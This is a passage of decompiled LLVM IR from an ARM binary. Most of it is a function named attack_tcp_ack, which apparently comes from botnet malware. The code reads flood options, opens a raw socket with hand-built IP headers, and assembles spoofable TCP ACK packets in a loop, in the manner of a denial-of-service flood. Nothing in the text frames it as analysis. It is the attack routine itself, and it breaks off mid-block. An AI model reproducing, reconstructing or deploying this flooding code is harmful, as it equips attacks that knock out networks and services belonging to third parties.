  uselistorder i32 %v0_a49c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 65535, i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 65535, i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 65535, i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* @r4, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* @r4, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* @r4, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
